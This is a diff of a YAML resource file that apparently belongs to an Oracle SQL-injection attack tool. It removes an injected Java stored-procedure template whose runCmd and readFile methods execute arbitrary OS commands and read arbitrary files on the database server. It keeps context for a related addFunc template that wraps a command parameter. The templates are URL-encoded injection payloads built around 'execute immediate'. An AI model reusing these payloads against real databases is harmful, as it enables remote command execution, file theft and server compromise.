@@ -100,37 +100,7 @@ resource:
   udf:
    dropSource: ; drop java source "%s"
    dropFunc: ; drop function %s
-  
-   addSource: |
-    ; begin execute immediate q'[
-      create or replace and compile java source named"%s"as
-        import java.io.*;
-        public class %s {
-          public static String runCmd(String args) {
-            try {
-              BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));
-              String stemp, str = "";
-              while ((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";
-              myReader.close();
-              return str;
-            } catch (Exception e) {
-              return e.toString();
-            }
-          }
-          public static String readFile(String filename) {
-            try {
-              BufferedReader myReader = new BufferedReader(new FileReader(filename));
-              String stemp, str = "";
-              while ((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";
-              myReader.close();
-              return str;
-            } catch (Exception e) {
-              return e.toString();
-            }
-          }
-        };
-      ]';end;
-  
+    
    addFunc: |
      ; begin execute immediate q'[
        create or replace function %s(p_cmd in varchar2)
